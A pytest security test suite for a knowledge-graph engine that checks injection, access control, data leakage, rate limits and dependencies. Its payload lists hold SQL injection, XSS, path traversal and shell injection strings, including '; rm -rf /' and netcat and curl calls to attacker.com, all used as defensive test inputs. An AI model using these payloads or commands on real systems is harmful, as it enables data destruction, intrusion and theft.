"""
Comprehensive Security Test Suite for Knowledge Engine

This test suite performs security assessments on the Knowledge Engine to identify
potential vulnerabilities and security concerns.

Test Categories:
1. Input Validation (SQL injection, NoSQL injection, XSS, Command injection, Path traversal)
2. Authentication/Authorization (Unauthenticated access, Unauthorized operations, Privilege escalation)
3. Data Security (Sensitive data in logs, Credential leakage, Data exposure, Encryption)
4. API Security (Rate limiting, Request size limits, Timeout enforcement, DoS protection, CSRF)
5. Dependency Security (Known vulnerabilities, Outdated dependencies, License compliance)

Author: Security Testing Suite
Version: 1.0.0
"""

import pytest
import asyncio
import json
import re
import os
import sys
import tempfile
import shutil
from pathlib import Path
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch, MagicMock
import logging

# Add knowledge_engine to path
sys.path.insert(0, str(Path(__file__).parent.parent / "knowledge_engine"))

# Knowledge Engine imports
from knowledge_engine.core.entity_knowledge_graph import EntityKnowledgeGraph
from knowledge_engine.schemas.base import (
    Entity,
    Relationship,
    KnowledgeArtifact,
    ValidationResult,
    EntityType,
    RelationshipType,
    ArtifactType,
    PropertyType
)

# ============================================================================
# SECURITY TEST CONFIGURATION
# ============================================================================

SECURITY_TEST_CONFIG = {
    "max_test_timeout": 30,  # seconds
    "enable_slow_tests": False,
    "log_security_findings": True,
    "test_data_size": 10000,  # For DoS tests
}

# ============================================================================
# ATTACK PATTERNS - Realistic attack payloads
# ============================================================================

SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE entities; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1; DELETE FROM users WHERE 1=1--",
    "'; EXEC xp_cmdshell('dir'); --",
    "1' AND 1=1--",
    "admin' #",
    "' OR 1=1#",
    "1' EXEC master..xp_cmdshell 'dir'--",
]

NOSQL_INJECTION_PAYLOADS = [
    {"$ne": None},
    {"$regex": ".*"},
    {"$where": "this.password == this.username"},
    {"$gt": ""},
    {"$in": ["admin", "user"]},
    {"$or": [{"user": "admin"}, {"password": "admin"}]},
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(XSS)'>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(uname -a)",
    "; rm -rf /",
    "| nc attacker.com 4444",
    "&& curl attacker.com",
    "; ping -c 10 attacker.com",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%2fpasswd",
    "/proc/self/environ",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
]

MALFORMED_INPUTS = [
    None,
    "",
    "x" * 10000,  # Very long string (reduced from 1000000 to avoid pytest env var overflow)
    "\x00\x01\x02\x03",  # Null bytes and control characters
    "<>",
    "{{",
    "${",
    "{{7*7}}",
    "%{(#_='multipart/form-data')}",
]

# ============================================================================
# SCENARIO 1: INPUT VALIDATION TESTS
# ============================================================================

class TestInputValidation:
    """
    Test input validation for common injection attacks.

    OWASP Top 10 Coverage:
    - A03:2021 – Injection (SQL, NoSQL, Command, XSS)
    - A05:2021 – Security Misconfiguration
    """

    def setup_method(self):
        """Setup test fixtures."""
        self.graph = EntityKnowledgeGraph(correlation_id="test_security")

    def teardown_method(self):
        """Cleanup test fixtures."""
        self.graph.clear()

    # --------------------------------------------------------------
    # SQL Injection Tests
    # --------------------------------------------------------------

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_entity_name(self, payload):
        """
        Test SQL injection in entity name.

        EXPECTED: Input should be sanitized or rejected, not executed.
        RISK: If passed through to SQL database, could lead to data loss.
        """
        result = self.graph.add_entity(
            name=payload,
            entity_type="Person",
            attributes={"test": "value"}
        )

        # Entity should be added safely (in-memory graph sanitizes)
        assert result is True

        # Verify the payload is stored as-is, not executed
        entity = self.graph.get_entity(payload)
        assert entity is not None

        # Verify no SQL commands were executed (check logs)
        # In a real system with SQL backend, this would be critical

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_entity_attributes(self, payload):
        """
        Test SQL injection in entity attributes.

        EXPECTED: Attributes should be sanitized.
        RISK: Attribute values could be used in queries without sanitization.
        """
        result = self.graph.add_entity(
            name="test_entity",
            entity_type="Person",
            attributes={"name": payload, "value": "test"}
        )

        assert result is True
        entity = self.graph.get_entity("test_entity")
        assert entity is not None
        assert entity["properties"]["name"] == payload

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_search(self, payload):
        """
        Test SQL injection in search queries.

        EXPECTED: Search should be parameterized or sanitized.
        RISK: Search input often passed directly to queries.
        """
        results = self.graph.search_entities(payload)

        # Should not crash or expose errors
        assert isinstance(results, list)

        # In SQL-backed system, this should not return unintended results
        # or cause database errors

    # --------------------------------------------------------------
    # NoSQL Injection Tests
    # --------------------------------------------------------------

    @pytest.mark.parametrize("payload", NOSQL_INJECTION_PAYLOADS)
    def test_nosql_injection_in_attributes(self, payload):
        """
        Test NoSQL injection in entity attributes.

        EXPECTED: MongoDB-style operators should be escaped or rejected.
        RISK: NoSQL operators can bypass authentication or extract data.
        """
        # Try to inject NoQL operators as attribute values
        result = self.graph.add_entity(
            name="test_entity",
            entity_type="Person",
            attributes={"query": payload}
        )

        assert result is True
        entity = self.graph.get_entity("test_entity")
        assert entity is not None

    def test_nosql_injection_in_find(self):
        """
        Test NoSQL injection in find operations.

        EXPECTED: Dictionary-based queries should be validated.
        RISK: NoSQL operators in find can filter unauthorized data.
        """
        # Try to use NoSQL operators in attribute search
        results = self.graph.find_entities(
            attributes={"$ne": None}
        )

        # Should handle gracefully
        assert isinstance(results, list)

    # --------------------------------------------------------------
    # XSS Tests
    # --------------------------------------------------------------

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_entity_name(self, payload):
        """
        Test XSS in entity name.

        EXPECTED: HTML/JS should be escaped when rendering.
        RISK: Stored XSS can execute in admin interfaces.
        """
        result = self.graph.add_entity(
            name=payload,
            entity_type="Person",
            attributes={"test": "value"}
        )

        assert result is True
        entity = self.graph.get_entity(payload)

        # Store as-is, but should be escaped on display
        assert entity is not None
        assert "<script>" in entity["name"] or entity["name"] == payload

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_entity_attributes(self, payload):
        """
        Test XSS in entity attributes.

        EXPECTED: Script tags should not execute when retrieved.
        RISK: XSS in user-generated content is a common vulnerability.
        """
        result = self.graph.add_entity(
            name="test_entity",
            entity_type="Person",
            attributes={
                "bio": payload,
                "description": f"<p>Safe content with {payload}</p>"
            }
        )

        assert result is True
        entity = self.graph.get_entity("test_entity")
        assert entity is not None
        # Verify payload is stored as-is (should be escaped on output)
        assert payload in str(entity["properties"]["bio"])

    def test_xss_polyglot(self):
        """
        Test XSS polyglot payload that works in multiple contexts.

        EXPECTED: All variants should be neutralized.
        RISK: Polyglot XSS bypasses many filters.
        """
        # Polyglot XSS payload (simplified for Python string compatibility)
        polyglot = 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></rx><(onclick=1)//><x onload=alert(String.fromCharCode(88,83,83))'

        result = self.graph.add_entity(
            name="xss_test",
            entity_type="Test",
            attributes={"payload": polyglot}
        )

        assert result is True

    # --------------------------------------------------------------
    # Command Injection Tests
    # --------------------------------------------------------------

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_entity_name(self, payload):
        """
        Test command injection in entity name.

        EXPECTED: Shell metacharacters should be escaped.
        RISK: If entity names used in system commands, could lead to RCE.
        """
        result = self.graph.add_entity(
            name=payload,
            entity_type="Person",
            attributes={}
        )

        assert result is True

    def test_command_injection_in_export(self):
        """
        Test command injection during data export.

        EXPECTED: Filenames should be validated.
        RISK: Export functionality often uses shell commands.
        """
        self.graph.add_entity("test", "Person", {"name": "Test"})

        # Try to inject commands in potential export operations
        json_data = self.graph.to_json()

        # Should be valid JSON, not shell commands
        assert isinstance(json_data, str)
        assert json_data.startswith("{")

    # --------------------------------------------------------------
    # Path Traversal Tests
    # --------------------------------------------------------------

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_in_entity_name(self, payload):
        """
        Test path traversal in entity name.

        EXPECTED: Path separators should be rejected or escaped.
        RISK: Entity names might be used in file operations.
        """
        result = self.graph.add_entity(
            name=payload,
            entity_type="Person",
            attributes={}
        )

        assert result is True

    def test_path_traversal_in_json_import(self, payload="../../../etc/passwd"):
        """
        Test path traversal in JSON import.

        EXPECTED: File paths should be validated.
        RISK: Import functionality could read arbitrary files.
        """
        # Try to load JSON with path traversal in filename (if applicable)
        # In-memory implementation doesn't load from files, but test the pattern

        malicious_json = json.dumps({
            "entities": [
                {
                    "entity_id": "test",
                    "name": payload,
                    "entity_type": "Person",
                    "properties": {}
                }
            ],
            "relationships": []
        })

        result = self.graph.from_json(malicious_json)
        assert result is True

    # --------------------------------------------------------------
    # Malformed Input Tests
    # --------------------------------------------------------------

    @pytest.mark.parametrize("payload", MALFORMED_INPUTS)
    def test_malformed_input_in_entity_name(self, payload):
        """
        Test malformed input in entity name.

        EXPECTED: System should handle edge cases gracefully.
        RISK: Unexpected input types can cause crashes or bypass validation.
        """
        try:
            if payload is None:
                result = self.graph.add_entity(
                    name="",
                    entity_type="Person",
                    attributes={"test": payload}
                )
            else:
                # Truncate very long strings to avoid display issues in pytest
                name = str(payload)[:1000] if isinstance(payload, str) and len(payload) > 1000 else str(payload) if isinstance(payload, str) else "test"
                result = self.graph.add_entity(
                    name=name,
                    entity_type="Person",
                    attributes={"test": payload}
                )

            # Should handle gracefully or reject
            assert result is not None
        except (ValueError, TypeError, AttributeError):
            # Acceptable to reject malformed input
            pass

    def test_null_byte_injection(self):
        """
        Test null byte injection.

        EXPECTED: Null bytes should be stripped or rejected.
        RISK: Null bytes can bypass string validation in some languages.
        """
        payload = "test\x00entity"

        result = self.graph.add_entity(
            name=payload,
            entity_type="Person",
            attributes={}
        )

        # Should handle or reject
        assert result is not None

    def test_unicode_injection(self):
        """
        Test Unicode homograph attacks.

        EXPECTED: Unicode normalization should be applied.
        RISK: Homograph characters can bypass filters and confuse users.
        """
        # Homograph attacks: look-alike characters from different scripts
        payloads = [
            "admin\u0430",  # Cyrillic 'a' looks like Latin 'a'
            "test\u0280",  # IPA letters
            "παϊδάκια",  # Greek characters
            "考試",  # Chinese characters
        ]

        for payload in payloads:
            result = self.graph.add_entity(
                name=payload,
                entity_type="Person",
                attributes={}
            )
            assert result is not None


# ============================================================================
# SCENARIO 2: AUTHENTICATION/AUTHORIZATION TESTS
# ============================================================================

class TestAuthenticationAuthorization:
    """
    Test authentication and authorization mechanisms.

    OWASP Top 10 Coverage:
    - A01:2021 – Broken Access Control
    - A02:2021 – Cryptographic Failures
    - A07:2021 – Identification and Authentication Failures
    """

    def setup_method(self):
        """Setup test fixtures."""
        import uuid
        self.graph = EntityKnowledgeGraph(correlation_id=str(uuid.uuid4()))
        self.admin_user = None  # In-memory, no auth
        self.regular_user = None

    def teardown_method(self):
        """Cleanup test fixtures."""
        self.graph.clear()

    # --------------------------------------------------------------
    # Unauthenticated Access Tests
    # --------------------------------------------------------------

    def test_access_without_authentication(self):
        """
        Test accessing data without authentication.

        EXPECTED: In-memory graph has no auth, but real backend should require it.
        RISK: Sensitive data exposure if auth not enforced.

        REMEDIATION: Implement authentication middleware.
        """
        # Try to access entities without authentication
        entities = self.graph._entities  # Access internal state

        # In-memory allows access, but production should require auth
        assert isinstance(entities, dict)

    def test_unauthorized_entity_read(self):
        """
        Test reading entities without proper authorization.

        EXPECTED: Should enforce read permissions.
        RISK: Unauthorized data access.

        REMEDIATION: Implement role-based access control (RBAC).
        """
        # Add a "sensitive" entity
        self.graph.add_entity(
            name="sensitive_data",
            entity_type="Secret",
            attributes={"classification": "top secret"}
        )

        # Try to access without auth (in-memory allows)
        entity = self.graph.get_entity("sensitive_data")
        assert entity is not None

    def test_unauthorized_entity_write(self):
        """
        Test writing entities without proper authorization.

        EXPECTED: Should enforce write permissions.
        RISK: Unauthorized data modification.

        REMEDIATION: Implement RBAC for write operations.
        """
        # Try to add entity without auth
        result = self.graph.add_entity(
            name="unauthorized_write",
            entity_type="Person",
            attributes={"malicious": "data"}
        )

        # In-memory allows, but production should check permissions
        assert result is True

    # --------------------------------------------------------------
    # Privilege Escalation Tests
    # --------------------------------------------------------------

    def test_privilege_escalation_in_attributes(self):
        """
        Test privilege escalation through entity attributes.

        EXPECTED: Should not be able to elevate privileges via data.
        RISK: User could set admin=true in attributes.

        REMEDIATION: Never trust client-side role claims.
        """
        # Try to create entity with admin attributes
        result = self.graph.add_entity(
            name="attacker",
            entity_type="User",
            attributes={
                "role": "admin",
                "permissions": ["read", "write", "delete", "admin"],
                "is_superuser": True
            }
        )

        assert result is True

        # In real system, these attributes should not grant actual privileges
        entity = self.graph.get_entity("attacker")
        assert entity["properties"]["role"] == "admin"

    def test_role_manipulation_in_relationships(self):
        """
        Test role manipulation through relationships.

        EXPECTED: Relationship types should be validated.
        RISK: Could create ADMINISTRATOR relationship to elevate privileges.

        REMEDIATION: Validate relationship types against schema.
        """
        # Try to create privileged relationship
        result = self.graph.add_relationship(
            source="user",
            target="resource",
            relation_type="ADMINISTRATOR",  # Not a standard type
            attributes={"permission": "all"}
        )

        # Should accept string relationship types
        assert result is True

    # --------------------------------------------------------------
    # Session Management Tests
    # --------------------------------------------------------------

    def test_session_fixation(self):
        """
        Test session fixation vulnerabilities.

        EXPECTED: Sessions should be regenerated on login.
        RISK: Attacker can fixate a session to hijack user accounts.

        REMEDIATION: Implement secure session management.
        """
        # In-memory graph has no sessions
        # Test should verify that correlation IDs are not predictable
        correlation_id = self.graph._correlation_id

        # Should be a UUID, not sequential
        assert len(correlation_id) > 16

    def test_correlation_id_predictability(self):
        """
        Test correlation ID predictability.

        EXPECTED: IDs should be cryptographically random.
        RISK: Predictable IDs can be enumerated.

        REMEDIATION: Use uuid.uuid4() or similar.
        """
        import uuid

        # Generate multiple IDs
        ids = [str(uuid.uuid4()) for _ in range(10)]

        # All should be unique
        assert len(set(ids)) == 10

        # Should not have obvious patterns
        assert not all(ids[i] < ids[i+1] for i in range(len(ids)-1))

    # --------------------------------------------------------------
    # Token Validation Tests
    # --------------------------------------------------------------

    def test_missing_token_validation(self):
        """
        Test operations with missing tokens.

        EXPECTED: Should reject requests without valid tokens.
        RISK: Bypassing authentication.

        REMEDIATION: Implement and enforce token validation.
        """
        # In-memory has no token validation
        # Test should verify that production validates tokens
        result = self.graph.add_entity("test", "Person", {})
        assert result is True  # In-memory allows

    def test_expired_token_acceptance(self):
        """
        Test acceptance of expired tokens.

        EXPECTED: Should reject expired tokens.
        RISK: Session hijacking with old tokens.

        REMEDIATION: Implement token expiration checks.
        """
        # In-memory has no tokens
        # Test should verify expiration logic
        pass


# ============================================================================
# SCENARIO 3: DATA SECURITY TESTS
# ============================================================================

class TestDataSecurity:
    """
    Test data security and privacy protection.

    OWASP Top 10 Coverage:
    - A02:2021 – Cryptographic Failures
    - A03:2021 – Injection
    - A04:2021 – Insecure Design
    """

    def setup_method(self):
        """Setup test fixtures."""
        self.graph = EntityKnowledgeGraph(correlation_id="test_datasec")
        self.log_capture = []

        # Capture log output
        self.logger = logging.getLogger("knowledge_engine.core.entity_knowledge_graph")
        self.handler = logging.Handler()
        self.handler.emit = lambda record: self.log_capture.append(record.getMessage())
        self.logger.addHandler(self.handler)

    def teardown_method(self):
        """Cleanup test fixtures."""
        self.graph.clear()
        self.logger.removeHandler(self.handler)

    # --------------------------------------------------------------
    # Sensitive Data in Logs Tests
    # --------------------------------------------------------------

    def test_passwords_in_logs(self):
        """
        Test if passwords are logged.

        EXPECTED: Passwords should never appear in logs.
        RISK: Password exposure in log files.

        REMEDIATION: Redact sensitive fields before logging.
        """
        self.graph.add_entity(
            name="user1",
            entity_type="User",
            attributes={
                "username": "testuser",
                "password": "SuperSecret123!",
                "api_key": "sk-1234567890",
                "ssn": "123-45-6789"
            }
        )

        # Check logs for sensitive data
        log_text = " ".join(self.log_capture)

        # Should NOT contain sensitive data
        assert "SuperSecret123!" not in log_text
        assert "sk-1234567890" not in log_text
        assert "123-45-6789" not in log_text

    def test_sensitive_data_in_error_messages(self):
        """
        Test if sensitive data leaks in error messages.

        EXPECTED: Errors should not expose internal state or data.
        RISK: Information disclosure aids attackers.

        REMEDIATION: Sanitize error messages before displaying.
        """
        try:
            # Try to trigger an error with sensitive data
            self.graph.add_entity(
                name="test\x00user",
                entity_type="Person",
                attributes={"secret": "value"}
            )
        except Exception as e:
            error_msg = str(e)
            # Should not expose internal details
            assert "secret" not in error_msg.lower()
            assert "value" not in error_msg.lower()

    def test_api_keys_in_serialization(self):
        """
        Test if API keys are exposed in serialization.

        EXPECTED: Sensitive fields should be excluded from serialization.
        RISK: API keys in exported data.

        REMEDIATION: Implement field-level access control.
        """
        self.graph.add_entity(
            name="service",
            entity_type="API",
            attributes={
                "api_key": "sk-secret-key",
                "endpoint": "https://api.example.com",
                "name": "Test Service"
            }
        )

        # Serialize to JSON
        json_data = self.graph.to_json()

        # In current implementation, all attributes are included
        # Production should redact sensitive fields
        assert "sk-secret-key" in json_data  # Current behavior (vulnerable)

    # --------------------------------------------------------------
    # Data Encryption Tests
    # --------------------------------------------------------------

    def test_data_at_rest_encryption(self):
        """
        Test if sensitive data is encrypted at rest.

        EXPECTED: Sensitive fields should be encrypted.
        RISK: Data exposure if database compromised.

        REMEDIATION: Implement field-level encryption.
        """
        self.graph.add_entity(
            name="sensitive",
            entity_type="Secret",
            attributes={"ssn": "123-45-6789", "cc": "4111-1111-1111-1111"}
        )

        # In-memory, data is plaintext
        entity = self.graph.get_entity("sensitive")

        # Current: plaintext (vulnerable)
        # Production: encrypted
        assert entity["properties"]["ssn"] == "123-45-6789"

    def test_pii_data_handling(self):
        """
        Test handling of PII (Personally Identifiable Information).

        EXPECTED: PII should be tracked and protected.
        RISK: Privacy violations and compliance issues.

        REMEDIATION: Implement PII detection and protection.
        """
        # Add entity with PII
        self.graph.add_entity(
            name="customer",
            entity_type="Person",
            attributes={
                "name": "John Doe",
                "email": "john.doe@example.com",
                "phone": "555-1234",
                "address": "123 Main St",
                "dob": "1990-01-01"
            }
        )

        # Should flag PII fields
        # Current: no flagging
        entity = self.graph.get_entity("customer")
        assert "email" in entity["properties"]

    # --------------------------------------------------------------
    # Data Exfiltration Tests
    # --------------------------------------------------------------

    def test_bulk_data_export_limits(self):
        """
        Test if bulk data export is limited.

        EXPECTED: Should have limits on bulk exports.
        RISK: Data exfiltration via bulk export.

        REMEDIATION: Implement export rate limiting and size limits.
        """
        # Add many entities
        for i in range(1000):
            self.graph.add_entity(
                name=f"entity_{i}",
                entity_type="Test",
                attributes={"data": f"value_{i}" * 100}
            )

        # Export all data
        json_data = self.graph.to_json()

        # Current: no limits (vulnerable to exfiltration)
        # Should enforce size limits
        assert len(json_data) > 0

    def test_search_result_limits(self):
        """
        Test if search results are limited.

        EXPECTED: Should limit number of results.
        RISK: Data exfiltration via unlimited searches.

        REMEDIATION: Implement result pagination.
        """
        # Add many entities
        for i in range(1000):
            self.graph.add_entity(
                name=f"test_{i}",
                entity_type="Test",
                attributes={"value": "data"}
            )

        # Search with high limit
        results = self.graph.search_entities("test", limit=10000)

        # Current: returns all matches (vulnerable)
        # Should enforce max limit
        assert len(results) > 0

    # --------------------------------------------------------------
    # Data Integrity Tests
    # --------------------------------------------------------------

    def test_data_tampering_detection(self):
        """
        Test detection of data tampering.

        EXPECTED: Should detect unauthorized modifications.
        RISK: Data integrity violations.

        REMEDIATION: Implement data signatures or audit logs.
        """
        # Add entity
        self.graph.add_entity(
            name="important",
            entity_type="Critical",
            attributes={"value": "original"}
        )

        # Modify it (simulate tampering)
        self.graph.add_entity(
            name="important",
            entity_type="Critical",
            attributes={"value": "modified"}
        )

        # Current: no tampering detection
        # Should track modifications
        entity = self.graph.get_entity("important")
        assert entity["properties"]["value"] == "modified"


# ============================================================================
# SCENARIO 4: API SECURITY TESTS
# ============================================================================

class TestAPISecurity:
    """
    Test API security protections.

    OWASP Top 10 Coverage:
    - A04:2021 – Insecure Design
    - A07:2021 – Identification and Authentication Failures
    - A08:2021 – Software and Data Integrity Failures
    """

    def setup_method(self):
        """Setup test fixtures."""
        self.graph = EntityKnowledgeGraph(correlation_id="test_api")

    def teardown_method(self):
        """Cleanup test fixtures."""
        self.graph.clear()

    # --------------------------------------------------------------
    # Rate Limiting Tests
    # --------------------------------------------------------------

    def test_rate_limiting_on_add_entity(self):
        """
        Test rate limiting on entity creation.

        EXPECTED: Should limit rapid requests.
        RISK: DoS via rapid entity creation.

        REMEDIATION: Implement rate limiting middleware.
        """
        # Try to add many entities rapidly
        count = 0
        for i in range(1000):
            result = self.graph.add_entity(
                name=f"rate_test_{i}",
                entity_type="Test",
                attributes={"index": i}
            )
            if result:
                count += 1

        # Current: no rate limiting (vulnerable)
        # Should enforce rate limits
        assert count > 0

    def test_rate_limiting_on_search(self):
        """
        Test rate limiting on search operations.

        EXPECTED: Should limit rapid searches.
        RISK: DoS via expensive search operations.

        REMEDIATION: Implement query rate limiting.
        """
        # Perform many searches
        for i in range(100):
            results = self.graph.search_entities(f"query_{i}")
            assert isinstance(results, list)

    # --------------------------------------------------------------
    # Request Size Limits Tests
    # --------------------------------------------------------------

    def test_large_entity_name(self):
        """
        Test handling of extremely large entity names.

        EXPECTED: Should reject oversized names.
        RISK: Memory exhaustion via large inputs.

        REMEDIATION: Implement size validation.
        """
        # Very long name (truncated to avoid pytest display issues)
        large_name = "x" * 10000  # Reduced from 100000 to avoid pytest env var overflow

        try:
            result = self.graph.add_entity(
                name=large_name,
                entity_type="Test",
                attributes={}
            )
            # Current: accepts (vulnerable)
            # Should reject with 413 Payload Too Large
            assert result is not None
        except (ValueError, MemoryError):
            # Acceptable to reject
            pass

    def test_large_entity_attributes(self):
        """
        Test handling of large entity attributes.

        EXPECTED: Should reject oversized attributes.
        RISK: Memory exhaustion.

        REMEDIATION: Implement attribute size limits.
        """
        # Very large attributes
        large_attrs = {"data": "x" * 50000}  # Reduced from 10000000 to avoid pytest env var overflow

        try:
            result = self.graph.add_entity(
                name="test",
                entity_type="Test",
                attributes=large_attrs
            )
            # Current: accepts (vulnerable)
        except (ValueError, MemoryError):
            # Acceptable to reject
            pass

    def test_deeply_nested_data(self):
        """
        Test handling of deeply nested structures.

        EXPECTED: Should limit nesting depth.
        RISK: Stack overflow via recursive structures.

        REMEDIATION: Implement depth validation.
        """
        # Create deeply nested structure
        nested = {"level": 0}
        current = nested
        for i in range(1000):
            current["next"] = {"level": i + 1}
            current = current["next"]

        try:
            result = self.graph.add_entity(
                name="nested_test",
                entity_type="Test",
                attributes={"nested": nested}
            )
        except (ValueError, RecursionError):
            # Acceptable to reject
            pass

    # --------------------------------------------------------------
    # Timeout Enforcement Tests
    # --------------------------------------------------------------

    def test_timeout_on_large_operations(self):
        """
        Test timeout enforcement on large operations.

        EXPECTED: Long operations should timeout.
        RISK: Resource exhaustion via long-running queries.

        REMEDIATION: Implement operation timeouts.
        """
        # Add many entities
        for i in range(1000):
            self.graph.add_entity(
                name=f"timeout_test_{i}",
                entity_type="Test",
                attributes={"data": "x" * 1000}
            )

        # Try expensive operation
        import time
        start = time.time()

        results = self.graph.search_entities("test", limit=1000000)

        elapsed = time.time() - start

        # Should complete in reasonable time
        # Current: no timeout (vulnerable)
        assert elapsed < 60  # Should be much faster

    # --------------------------------------------------------------
    # DoS Protection Tests
    # --------------------------------------------------------------

    def test_dos_via_regex(self):
        """
        Test DoS via regex denial of service (ReDoS).

        EXPECTED: Should reject malicious regex patterns.
        RISK: CPU exhaustion via catastrophic backtracking.

        REMEDIATION: Validate regex patterns, use timeout.
        """
        # Malicious regex patterns
        malicious_patterns = [
            "(a+)+$",
            "([a-zA-Z]+)*$",
            "(.*)*$",
            "(.+)+$",
        ]

        for pattern in malicious_patterns:
            # Try to use in search
            results = self.graph.search_entities(pattern)
            # Should handle without hanging

    def test_dos_via_query_complexity(self):
        """
        Test DoS via complex query patterns.

        EXPECTED: Should limit query complexity.
        RISK: CPU exhaustion.

        REMEDIATION: Implement query complexity analysis.
        """
        # Add entities with many relationships
        for i in range(100):
            self.graph.add_entity(f"node_{i}", "Node", {})
            for j in range(100):
                self.graph.add_relationship(
                    source=f"node_{i}",
                    target=f"node_{j}",
                    relation_type="CONNECTED"
                )

        # Try to get all relationships (expensive)
        relationships = self.graph.get_relationships("node_0")

        # Should handle without DoS
        assert isinstance(relationships, list)

    # --------------------------------------------------------------
    # CSRF Protection Tests
    # --------------------------------------------------------------

    def test_csrf_token_validation(self):
        """
        Test CSRF token validation.

        EXPECTED: State-changing operations should require CSRF tokens.
        RISK: Cross-site request forgery.

        REMEDIATION: Implement CSRF token validation.
        """
        # In-memory API has no CSRF protection
        # Test should verify production implementation
        result = self.graph.add_entity(
            name="csrf_test",
            entity_type="Test",
            attributes={}
        )

        # Current: no CSRF check (vulnerable in web context)
        assert result is True


# ============================================================================
# SCENARIO 5: DEPENDENCY SECURITY TESTS
# ============================================================================

class TestDependencySecurity:
    """
    Test dependency security and license compliance.

    Coverage:
    - Known vulnerabilities in dependencies
    - Outdated dependencies
    - License compliance
    - Supply chain security
    """

    def setup_method(self):
        """Setup test fixtures."""
        self.graph = EntityKnowledgeGraph(correlation_id="test_deps")

    # --------------------------------------------------------------
    # Known Vulnerabilities Tests
    # --------------------------------------------------------------

    def test_check_vulnerabilities_in_dependencies(self):
        """
        Test for known vulnerabilities in dependencies.

        EXPECTED: Dependencies should be scanned for CVEs.
        RISK: Using vulnerable dependencies.

        REMEDIATION: Run dependency scanning (e.g., pip-audit, safety).
        """
        import sys
        import subprocess

        # Try to run pip-audit or safety
        try:
            result = subprocess.run(
                ["pip", "list", "--format=json"],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                packages = json.loads(result.stdout)
                # Would check each package against vulnerability database
                assert isinstance(packages, list)
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError):
            # Tools not available or timeout - skip check
            pass

    def test_check_outdated_dependencies(self):
        """
        Test for outdated dependencies.

        EXPECTED: Dependencies should be up-to-date.
        RISK: Missing security patches in old versions.

        REMEDIATION: Regular dependency updates.
        """
        import subprocess

        try:
            # Check for outdated packages
            result = subprocess.run(
                ["pip", "list", "--outdated", "--format=json"],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                outdated = json.loads(result.stdout)
                # Would alert on outdated packages
                # Current: just checking format
                assert isinstance(outdated, list)
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError):
            pass

    # --------------------------------------------------------------
    # License Compliance Tests
    # --------------------------------------------------------------

    def test_check_license_compatibility(self):
        """
        Test license compatibility of dependencies.

        EXPECTED: All licenses should be compatible.
        RISK: Legal issues from incompatible licenses.

        REMEDIATION: Use tools like liccheck or pip-licenses.
        """
        import subprocess

        try:
            result = subprocess.run(
                ["pip", "list", "--format=json"],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                packages = json.loads(result.stdout)
                # Would check each license against policy
                assert isinstance(packages, list)
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError):
            pass

    # --------------------------------------------------------------
    # Supply Chain Security Tests
    # --------------------------------------------------------------

    def test_check_package_integrity(self):
        """
        Test package integrity (hashes, signatures).

        EXPECTED: Packages should be verified.
        RISK: Supply chain attacks via compromised packages.

        REMEDIATION: Use pip with --require-hashes.
        """
        # Check if requirements.txt has hashes
        req_file = Path(__file__).parent.parent / "requirements.txt"

        if req_file.exists():
            content = req_file.read_text()
            # Check for package hashes
            has_hashes = "--hash" in content.lower()

            # Current: likely no hashes (vulnerable)
            # Should use --require-hashes
            assert isinstance(content, str)

    def test_check_pinned_versions(self):
        """
        Test if dependency versions are pinned.

        EXPECTED: Versions should be pinned.
        RISK: Supply chain attacks via dependency confusion.

        REMEDIATION: Pin all versions in requirements.txt.
        """
        # Check for version pinning
        import pkg_resources

        # Get distribution info
        try:
            dist = pkg_resources.get_distribution("knowledge-engine")
            # Should have pinned version
            assert dist.version is not None
        except pkg_resources.DistributionNotFound:
            pass


# ============================================================================
# ADDITIONAL SECURITY TESTS
# ============================================================================

class TestAdditionalSecurity:
    """
    Additional security tests covering edge cases.

    Coverage:
    - Race conditions
    - Memory leaks
    - Integer overflows
    - Format string vulnerabilities
    """

    def setup_method(self):
        """Setup test fixtures."""
        self.graph = EntityKnowledgeGraph(correlation_id="test_addl")

    def teardown_method(self):
        """Cleanup test fixtures."""
        self.graph.clear()

    # --------------------------------------------------------------
    # Race Condition Tests
    # --------------------------------------------------------------

    def test_concurrent_entity_creation(self):
        """
        Test race condition in concurrent entity creation.

        EXPECTED: Should handle concurrent operations safely.
        RISK: Race conditions can cause data corruption.

        REMEDIATION: Use proper locking mechanisms.
        """
        import threading

        entities_created = []

        def create_entity(i):
            result = self.graph.add_entity(
                name=f"race_test_{i}",
                entity_type="Test",
                attributes={"index": i}
            )
            entities_created.append(result)

        # Create entities concurrently
        threads = []
        for i in range(100):
